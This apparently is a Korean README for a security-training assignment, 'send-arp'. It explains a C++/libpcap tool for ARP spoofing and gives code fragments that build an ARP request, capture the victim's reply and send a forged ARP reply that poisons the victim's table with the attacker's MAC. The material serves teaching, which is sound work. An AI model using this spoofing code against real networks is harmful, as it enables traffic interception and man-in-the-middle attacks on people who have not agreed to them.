# BoB 14기 보안제품개발트랙 과제 : send-arp


## 과제

Sender(Victim)의 ARP table을 변조하라.

### 실행

```cpp
syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]
sample : sudo ./send-arp wlan0 10.3.3.16 10.3.3.1

```

---

- Victim(Sender)의 ARP 테이블을 조작하여 Gateway(Target)의 MAC 주소를 Attacker의 MAC으로 바꾸는 **ARP 스푸핑** 공격을 수행
- tech: `pcap_sendpacket()`으로 패킷 전송, `pcap_next_ex()`로 응답 수신

---

### 로직 설계

1. 공격자의 인터페이스에서 MAC 주소를 읽음
2. sender IP가 사용하는 MAC 주소를 얻기 위해 ARP Request를 브로드캐스트로 전송
3. sender의 ARP Reply를 수신하여 sender의 MAC 주소를 획득
4. 위 정보를 바탕으로 위조된 ARP Reply(ARP 감염 패킷)을 sender에게 전송
5. sender는 target IP에 대해 attacker MAC을 매핑함 → **ARP 테이블 변조 성공**

---

### 주요 구조체 설명

### 코드 설명

### 헤더 구조 설명 (`send-arp.h`)

### Ethernet 헤더 (`eth_hdr_t`)

```cpp
#define MAC_LEN 6
#define IP_LEN 4

```

MAC 주소(6바이트)와 IPv4 주소(4바이트)의 길이 정의

```cpp
struct eth_hdr_t {
    uint8_t dmac[6]; // 목적지 MAC
    uint8_t smac[6]; // 출발지 MAC
    uint16_t type;   // 상위 프로토콜 (0x0806: ARP)
};
```

`uint8_t`는 정확히 1바이트

MAC 주소는 6바이트이므로 `uint8_t[6]`로 표현

ARP를 위해 type 필드는 0x0806으로 설정된다. `#pragma pack(1)`은 **패딩 없이 구조체를 메모리에 붙여 저장**하도록 한다.(네트워크 패킷은 바이트 단위로 정해진 형식이기 때문)

### ARP 헤더 (`arp_hdr_t`)

```cpp
struct arp_hdr_t {
    uint16_t hrd;     // 하드웨어 타입 (1: Ethernet)
    uint16_t pro;     // 프로토콜 타입 (0x0800: IPv4)
    uint8_t hln;      // MAC 길이 (6)
    uint8_t pln;      // IP 길이 (4)
    uint16_t op;      // 1: request, 2: reply -> 오퍼레이션코드
    uint8_t smac[6];  // 출발지 MAC
    uint8_t sip[4];   // 출발지 IP
    uint8_t tmac[6];  // 목적지 MAC
    uint8_t tip[4];   // 목적지 IP
};

```

**`op` 필드로 request/reply를 구분한다.** 

### 3. send-arp.cpp

### `get_mac()`

```cpp
bool get_mac(const std::string& iface, uint8_t* mac)

```

`/sys/class/net/<iface>/address`에서 MAC 주소를 문자열로 읽고, `std::stoi(..., 16)`으로 16진수 문자열을 숫자로 변환해 byte 배열에 저장. 

`:` 제거 후 2자리씩 나눠 파싱

`pcap_open_live()`

```cpp
pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
```

`BUFSIZ`: 캡처 버퍼 사이즈
`1`: promiscuous 모드로 설정 (내 MAC이 아닌 패킷도 수신 하기 위해서)
`1`: timeout(ms), 너무 짧으면 패킷을 못 받을 수 있기 때문

---

### ARP Request 패킷 구성

```cpp
memset(eth->dmac, 0xff, MAC_LEN); // 브로드캐스트
memcpy(eth->smac, attacker_mac, MAC_LEN);
eth->type = htons(0x0806);

 
```

`host to network short(htons)` : 네트워크는 Big Endian, 시스템은 Little Endian일 수 있으므로 명시적 변환을 하기 위해서

```cpp
arp->op  = htons(1); // ARP Request
inet_pton(AF_INET, target_ip, arp->sip); // source는 내가 target이라 가정
inet_pton(AF_INET, sender_ip, arp->tip); // 목적지는 sender

```

ARP Request는 이 IP 주소를 가진 장치에게  MAC 주소가 무엇인지를 묻는다.

`arp->op = htons(1);`-> ARP Request(요청) 패킷임을 명시하는 부분

***ARP 프로토콜에서 op (Operation) 필드**

| 값 | 의미 |
| --- | --- |
| 1 | ARP Request |
| 2 | ARP Reply |

*ARP 패킷은 네트워크 바이트 순서(Big Endian) 를 사용함

**ARP 요청을 sender에게 한 이유** → 목적은 sender의 MAC 주소를 얻는 것.

즉, `target_ip`에서 `sender_ip`의 MAC을 알아내는 요청을 broadcast로 뿌려 주었다. 

---

### ARP Reply 수신 (sender의 MAC 획득)

```cpp
	while (true) {
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res != 1) continue;

		auto* r_eth = (eth_hdr_t*)pkt;
		auto* r_arp = (arp_hdr_t*)(pkt + sizeof(eth_hdr_t));

		if (ntohs(r_eth->type) == 0x0806 &&
			ntohs(r_arp->op) == 2 &&
			memcmp(r_arp->sip, arp->tip, IP_LEN) == 0) {
			memcpy(sender_mac, r_arp->smac, MAC_LEN);
		break;
			}
	}

```

원하는 ARP Reply가 올 때까지 while문으로 반복해주었다. 

ARP Reply 필터링해 주었다. 

패킷을 캡처하는 `pcap_next_ex()` 를 반복해서 MAC 주소를 추출한다. 

EtherType이 0x0806인지를 확인하고, ARP Reply인지(2) 확인한 뒤, 보내는 쪽 IP가 우리가 ARP 요청한 대상(sender_ip)인지 확인한다. (`sip == sender_ip`이면 응답 보낸 건 sender이다.)

---

### 위조된 ARP Reply 전송 (감염 패킷)

```cpp
arp->op  = htons(2); // ARP Reply
memcpy(arp->smac, attacker_mac, MAC_LEN);  // 출발 MAC = attacker (위조)
inet_pton(AF_INET, target_ip, arp->sip);   // 출발 IP = target (위조)
memcpy(arp->tmac, sender_mac, MAC_LEN);    // 목적 MAC = sender
inet_pton(AF_INET, sender_ip, arp->tip);   // 목적 IP = sender

```

sender에게 보내는 위조된 패킷이다.

`arp->op = htons(2);`-> ARP Reply(응답) 패킷임을 명시하는 부분이다. 

2를 넣으면 이 패킷이 ARP Reply임을 나타낸다. arp reply 패킷으로 위장해야 하므로 해당 코드를 사용한다.

---

### knowledge

| 구성 요소 | 크기 (bytes) |  
| --- | --- | --- |
| Ethernet Header | 14 bytes |  
| ARP Header | 28 bytes |  
| 합계 | **42 bytes** |

---

### **Reference**

[Attacker(자신) Mac 주소 값를 알아 내는 방법]

https://github.com/YOGYUI/Sniffets/tree/main/linux_get_mac_address/src

**GPT, Claude**

https://chatgpt.com/

https://claude.ai/

[op 1,2]

https://whatdocumentary.tistory.com/52

### Issue

---

ARP Request 보냈는데 되지 않았다. 알고보니, `op = 1` 을 그냥 넣고, `htons()` 을 넣지 않아서였다. ARP op 필드가 0x0100이 된 것이다.
